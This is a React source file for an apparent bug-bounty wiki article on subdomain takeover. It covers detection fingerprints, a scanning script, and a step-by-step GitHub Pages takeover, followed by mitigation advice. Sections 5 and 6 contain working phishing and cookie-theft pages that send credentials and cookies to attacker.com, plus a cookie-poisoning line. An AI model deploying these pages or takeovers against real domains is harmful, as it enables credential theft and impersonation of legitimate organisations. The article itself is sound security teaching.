/**
 * SUBDOMAIN TAKEOVER
 * Taking control of abandoned subdomains
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function SubdomainTakeoverContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="Subdomain Takeover - The Abandoned DNS">
        <Paragraph>
          <Strong>Subdomain Takeover</Strong> occurs when a subdomain points (DNS CNAME) 
          to a third-party service that no longer exists or is not claimed. Attacker can 
          register that service and control the subdomain.
        </Paragraph>

        <AlertDanger title="Subdomain Takeover Impact">
          <ul className="mt-2 space-y-1">
            <ListItem>🎯 Phishing from legitimate domain</ListItem>
            <ListItem>🍪 Cookie theft (subdomain cookie scope)</ListItem>
            <ListItem>🔐 CSP bypass (trusted-types from subdomain)</ListItem>
            <ListItem>📧 Send emails from trusted domain</ListItem>
            <ListItem>⚡ Inject JavaScript into main page</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="how-it-works" title="1. How a Takeover Occurs">
        <CodeBlock
          language="bash"
          title="Typical vulnerable scenario"
          code={`# 1. Company configures subdomain for temporary project
blog.victim.com → CNAME → victim-blog.herokuapp.com

# 2. Project is cancelled, Heroku app is deleted
# But DNS CNAME is NOT deleted

# 3. DNS still points to non-existent Heroku app
$ dig blog.victim.com
blog.victim.com. 300 IN CNAME victim-blog.herokuapp.com.
victim-blog.herokuapp.com. → NXDOMAIN  # ← Doesn't exist ✓

# 4. Attacker registers victim-blog.herokuapp.com
# Now attacker controls blog.victim.com ✓`}
        />

        <AlertWarning>
          If <InlineCode>dig</InlineCode> shows CNAME but destination gives NXDOMAIN or 
          service-specific 404 error → POTENTIALLY VULNERABLE.
        </AlertWarning>
      </Section>

      <Section id="vulnerable-services" title="2. Common Cloud Services">
        <Subsection title="GitHub Pages">
          <CodeBlock
            language="bash"
            title="Detect GitHub Pages takeover"
            code={`$ dig docs.victim.com
docs.victim.com. 300 IN CNAME victim.github.io.

$ curl https://docs.victim.com
# If response:
"There isn't a GitHub Pages site here."

# → VULNERABLE ✓

# Exploit:
# 1. Create repo: victim/victim.github.io
# 2. Add CNAME file with: docs.victim.com
# 3. Now attacker controls docs.victim.com`}
          />
          
          <HighlightBox color="red">
            <Strong>GitHub Pages Fingerprint:</Strong> Error "There isn't a GitHub Pages site here."
          </HighlightBox>
        </Subsection>

        <Subsection title="Heroku">
          <CodeBlock
            language="bash"
            title="Detect Heroku takeover"
            code={`$ dig app.victim.com
app.victim.com. 300 IN CNAME victim-app.herokuapp.com.

$ curl https://app.victim.com
# If response:
"No such app"

# → VULNERABLE ✓

# Exploit:
# 1. heroku create victim-app
# 2. Deploy malicious content
# 3. app.victim.com now points to attacker's app`}
          />
          
          <HighlightBox color="red">
            <Strong>Heroku Fingerprint:</Strong> Error "No such app"
          </HighlightBox>
        </Subsection>

        <Subsection title="AWS S3">
          <CodeBlock
            language="bash"
            title="Detect S3 takeover"
            code={`$ dig static.victim.com
static.victim.com. 300 IN CNAME victim-static.s3.amazonaws.com.

$ curl https://static.victim.com
# If XML response:
<Error>
  <Code>NoSuchBucket</Code>
  <Message>The specified bucket does not exist</Message>
</Error>

# → VULNERABLE ✓

# Exploit:
# 1. Create S3 bucket: victim-static
# 2. Configure static website hosting
# 3. Upload malicious index.html
# 4. static.victim.com now served by attacker`}
          />
          
          <HighlightBox color="red">
            <Strong>S3 Fingerprint:</Strong> XML with "NoSuchBucket"
          </HighlightBox>
        </Subsection>

        <Subsection title="Azure">
          <CodeBlock
            language="bash"
            title="Detect Azure takeover"
            code={`$ dig cdn.victim.com
cdn.victim.com. 300 IN CNAME victim.azurewebsites.net.

$ curl https://cdn.victim.com
# If response:
"404 - Web app does not exist"

# → VULNERABLE ✓

# Exploit:
# 1. Register Azure app: victim.azurewebsites.net
# 2. Deploy malicious content
# 3. cdn.victim.com controlled by attacker`}
          />
        </Subsection>

        <Subsection title="AWS CloudFront">
          <CodeBlock
            language="bash"
            title="CloudFront takeover"
            code={`$ dig assets.victim.com
assets.victim.com. 300 IN CNAME d111111abcdef8.cloudfront.net.

$ curl https://assets.victim.com
# Error:
<Error>
  <Code>NoSuchDistribution</Code>
</Error>

# → VULNERABLE ✓

# Exploit (more complex):
# 1. Create CloudFront distribution
# 2. Configure alternate domain: assets.victim.com
# 3. If victim.com has NO restrictive CAA record → Takeover possible`}
          />
        </Subsection>
      </Section>

      <Section id="mass-detection" title="3. Mass Subdomain Detection">
        <CodeBlock
          language="bash"
          title="Enumerate subdomains with Subfinder"
          code={`# Install subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Enumerate subdomains
subfinder -d victim.com -o subdomains.txt

# Result:
# www.victim.com
# blog.victim.com
# api.victim.com
# old-app.victim.com
# test.victim.com
# ... 500+ subdomains`}
        />

        <CodeBlock
          language="bash"
          title="Verify takeovers with SubOver"
          code={`# Install SubOver
go install github.com/Ice3man543/SubOver@latest

# Verify all subdomains
subover -l subdomains.txt -v

# Output:
[!] blog.victim.com → victim-blog.herokuapp.com [Heroku]
[!] docs.victim.com → victim.github.io [GitHub Pages]
[!] cdn.victim.com → d12345.cloudfront.net [CloudFront]

# ✓ 3 potential takeovers detected`}
        />

        <CodeBlock
          language="python"
          title="Custom script to verify CNAMEs"
          code={`import dns.resolver
import requests
import concurrent.futures

# Fingerprints of vulnerable services
FINGERPRINTS = {
    'github.io': "There isn't a GitHub Pages site here",
    'herokuapp.com': "No such app",
    's3.amazonaws.com': "NoSuchBucket",
    'azurewebsites.net': "404 - Web app does not exist",
    'cloudfront.net': "NoSuchDistribution"
}

def check_subdomain(subdomain):
    try:
        # Resolve CNAME
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        cname = str(answers[0].target)
        
        # Check if points to known service
        for service, fingerprint in FINGERPRINTS.items():
            if service in cname:
                # Try HTTP
                try:
                    response = requests.get(f'https://{subdomain}', timeout=5)
                    
                    if fingerprint in response.text:
                        print(f'[!] VULNERABLE: {subdomain} → {cname}')
                        print(f'    Fingerprint: {fingerprint}')
                        return subdomain
                except:
                    pass
    except:
        pass
    
    return None

# Read subdomains
with open('subdomains.txt') as f:
    subdomains = [line.strip() for line in f]

# Verify in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(check_subdomain, subdomains)
    
vulnerable = [r for r in results if r]
print(f'\\n[+] Found {len(vulnerable)} potential takeovers')`}
        />
      </Section>

      <Section id="complete-exploit" title="4. Complete Exploit - GitHub Pages Takeover">
        <CodeBlock
          language="bash"
          title="Step 1: Verify vulnerability"
          code={`$ dig docs.victim.com
docs.victim.com. 300 IN CNAME victim.github.io.

$ curl https://docs.victim.com
There isn't a GitHub Pages site here.

# ✓ Vulnerable - GitHub Pages doesn't exist`}
        />

        <CodeBlock
          language="bash"
          title="Step 2: Create GitHub repository"
          code={`# Option 1: Create repo with username 'victim' (requires available username)
# Option 2: Use organization

# Create repo:
# Name: victim.github.io  (if username is 'victim')
# Or: victim/victim.github.io (if organization)

# Clone
git clone https://github.com/victim/victim.github.io
cd victim.github.io`}
        />

        <CodeBlock
          language="bash"
          title="Step 3: Configure custom domain"
          code={`# Create CNAME file
echo "docs.victim.com" > CNAME

# Create demonstration page
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Subdomain Takeover PoC</title>
</head>
<body>
  <h1>🚨 Subdomain Takeover Proof of Concept</h1>
  <p>This subdomain (docs.victim.com) has been taken over.</p>
  <p>Reported by: [YOUR_NAME]</p>
  <script>
    // Demonstrate access to parent domain cookies
    console.log('Cookies:', document.cookie);
    alert('Subdomain Takeover PoC - Cookie access: ' + document.cookie);
  </script>
</body>
</html>
EOF

# Commit and push
git add .
git commit -m "PoC: Subdomain takeover"
git push origin main`}
        />

        <CodeBlock
          language="bash"
          title="Step 4: Enable GitHub Pages"
          code={`# In GitHub repo settings:
# 1. Go to Settings → Pages
# 2. Source: Deploy from main branch
# 3. Wait ~1 minute

# Verify
curl https://docs.victim.com
# → PoC page loaded ✓

# Now attacker controls docs.victim.com completely`}
        />
      </Section>

      <Section id="phishing-attack" title="5. Advanced Phishing Attack">
        <CodeBlock
          language="html"
          title="Phishing page on taken over subdomain"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Victim Corp - Employee Portal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
    }
    .logo { text-align: center; margin-bottom: 30px; }
    input { width: 100%; padding: 10px; margin: 10px 0; }
    button {
      width: 100%;
      padding: 10px;
      background: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="logo">
    <h1>🏢 Victim Corp</h1>
    <p>Employee Login Portal</p>
  </div>
  
  <form id="loginForm">
    <input type="email" name="email" placeholder="Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Sign In</button>
  </form>
  
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = e.target.email.value;
      const password = e.target.password.value;
      
      // Exfiltrate credentials
      await fetch('https://attacker.com/phish', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          subdomain: 'login.victim.com',
          cookies: document.cookie,
          referrer: document.referrer
        })
      });
      
      // Redirect to real login
      window.location = 'https://victim.com/login?error=invalid';
    });
  </script>
</body>
</html>

<!-- Victims see URL: https://login.victim.com
Valid SSL cert (*.victim.com)
Legitimate domain → High phishing conversion rate ✓
-->`}
        />
      </Section>

      <Section id="cookie-theft" title="6. Parent Domain Cookie Theft">
        <CodeBlock
          language="html"
          title="Cookie access from subdomain takeover"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Subdomain Takeover - Cookie Theft</h1>
  
  <script>
    // Subdomain can read parent domain cookies
    // if cookies don't have specific 'Domain' flag
    
    const cookies = document.cookie;
    console.log('Stolen cookies:', cookies);
    
    // Cookies with Domain=.victim.com are accessible from:
    // www.victim.com
    // app.victim.com
    // takeover.victim.com ← Taken over subdomain ✓
    
    // Exfiltrate
    fetch('https://attacker.com/cookie-steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: cookies,
        subdomain: window.location.hostname
      })
    });
    
    // Can also SET cookies for parent domain
    document.cookie = 'admin=true; Domain=.victim.com; Path=/';
    // → Cookie poisoning attack ✓
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="tools" title="7. Detection Tools">
        <Subsection title="can-i-take-over-xyz">
          <CodeBlock
            language="bash"
            title="Complete fingerprints list"
            code={`# GitHub repo: EdOverflow/can-i-take-over-xyz
# Contains fingerprints for 70+ services

# Covered services:
# - AWS (S3, CloudFront, Elastic Beanstalk)
# - Azure (Websites, CDN, Traffic Manager)
# - GitHub Pages
# - Heroku
# - WordPress.com
# - Shopify
# - Tumblr
# - Bitbucket
# - Cargo Collective
# - And many more...

# Use as reference for updated fingerprints`}
          />
        </Subsection>

        <Subsection title="Nuclei Templates">
          <CodeBlock
            language="bash"
            title="Scan with Nuclei"
            code={`# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# Scan subdomains for takeovers
cat subdomains.txt | nuclei -t takeovers/

# Templates include:
# - aws-bucket-takeover.yaml
# - azure-takeover.yaml
# - github-takeover.yaml
# - heroku-takeover.yaml
# - And 50+ more services`}
          />
        </Subsection>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Prevent Subdomain Takeovers">
          Maintain updated DNS inventory and remove orphan CNAMEs.
        </AlertDanger>

        <Subsection title="1. Remove CNAMEs Before Deleting Services">
          <CodeBlock
            language="bash"
            title="✅ Secure decommissioning process"
            code={`# CORRECT ORDER:

# 1. FIRST - Delete DNS record
# In Cloudflare/Route53/etc:
# Delete: blog.victim.com CNAME victim-blog.herokuapp.com

# 2. Wait for DNS propagation (24-48h)
dig blog.victim.com
# NXDOMAIN ✓

# 3. AFTER - Delete cloud service
heroku apps:destroy victim-blog

# ❌ INCORRECT:
# 1. Delete Heroku app
# 2. Forget DNS → VULNERABLE`}
          />
        </Subsection>

        <Subsection title="2. Continuous DNS Monitoring">
          <CodeBlock
            language="python"
            title="✅ Automated monitoring script"
            code={`import dns.resolver
import requests
from datetime import datetime

def check_dns_health():
    # Subdomains that should exist
    expected_subdomains = {
        'www.victim.com': 'CNAME cdn.victim.com',
        'api.victim.com': 'A 1.2.3.4',
        'app.victim.com': 'CNAME app-prod.herokuapp.com'
    }
    
    for subdomain, expected in expected_subdomains.items():
        try:
            # Resolve DNS
            record_type = expected.split()[0]
            answers = dns.resolver.resolve(subdomain, record_type)
            
            # Verify HTTP 200 response
            response = requests.get(f'https://{subdomain}', timeout=5)
            
            if response.status_code not in [200, 301, 302]:
                print(f'[!] ALERT: {subdomain} returned {response.status_code}')
                send_alert(f'{subdomain} may be vulnerable to takeover')
                
        except dns.resolver.NXDOMAIN:
            print(f'[!] CRITICAL: {subdomain} NXDOMAIN - potential takeover')
            send_alert(f'{subdomain} DNS not resolving')
        except:
            print(f'[!] WARNING: {subdomain} not accessible')

# Run every hour
schedule.every().hour.do(check_dns_health)`}
          />
        </Subsection>

        <Subsection title="3. CAA Records to Prevent Certificate Takeover">
          <CodeBlock
            language="bash"
            title="✅ Configure CAA records"
            code={`# CAA (Certification Authority Authorization)
# Specifies which CAs can issue certs for your domain

# Configure in DNS:
victim.com. IN CAA 0 issue "letsencrypt.org"
victim.com. IN CAA 0 issue "digicert.com"
victim.com. IN CAA 0 issuewild ";"  # Prohibit wildcards

# This prevents attacker from getting SSL cert for
# taken over subdomain if using different CA`}
          />
        </Subsection>

        <Subsection title="4. Proactively Claim Cloud Resources">
          <CodeBlock
            language="bash"
            title="✅ Maintain services even if unused"
            code={`# Option 1: Keep placeholder apps
# On Heroku, S3, etc., maintain minimal apps

# Option 2: Wildcard registrations
# Register: *.victim.com on cloud services
# Prevents attacker from using similar name

# Option 3: Monitoring script that automatically
# registers services if DNS pointing to them is detected`}
          />
        </Subsection>

        <Subsection title="5. Secure Cookie Policy">
          <CodeBlock
            language="javascript"
            title="✅ Cookies with specific Domain"
            code={`// ❌ VULNERABLE - Cookie accessible from subdomains
res.cookie('session', token, {
  domain: '.victim.com',  // ← Accessible from ALL subdomains
  httpOnly: true,
  secure: true
});

// ✅ SECURE - Cookie only on exact domain
res.cookie('session', token, {
  // DON'T set domain → Only accessible on www.victim.com
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// If subdomain is taken over, CANNOT read these cookies ✓`}
          />
        </Subsection>

        <Subsection title="6. Content Security Policy with Subdomains">
          <CodeBlock
            language="javascript"
            title="✅ Restrictive CSP"
            code={`// ❌ VULNERABLE - Trust all subdomains
res.setHeader('Content-Security-Policy', 
  "script-src 'self' *.victim.com"
);
// If blog.victim.com is taken over → Can inject JS ✓

// ✅ SECURE - List specific subdomains
res.setHeader('Content-Security-Policy', 
  "script-src 'self' cdn.victim.com api.victim.com"
);
// Only specific subdomains allowed`}
          />
        </Subsection>

        <Subsection title="7. Regular DNS Audit">
          <CodeBlock
            language="bash"
            title="✅ Monthly audit script"
            code={`#!/bin/bash
# dns-audit.sh - Check for orphan CNAMEs

# Get all CNAMEs
dig victim.com ANY +noall +answer | grep CNAME > cnames.txt

# Verify each CNAME
while read line; do
  subdomain=$(echo $line | awk '{print $1}')
  target=$(echo $line | awk '{print $5}')
  
  # Try to resolve target
  if ! dig $target +short > /dev/null 2>&1; then
    echo "[!] ORPHAN CNAME: $subdomain → $target (NXDOMAIN)"
  fi
done < cnames.txt

# Run monthly in cron:
# 0 0 1 * * /root/dns-audit.sh | mail -s "DNS Audit" security@victim.com`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: Open Redirect</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/open-redirect`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Bypassing redirect validation for phishing</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
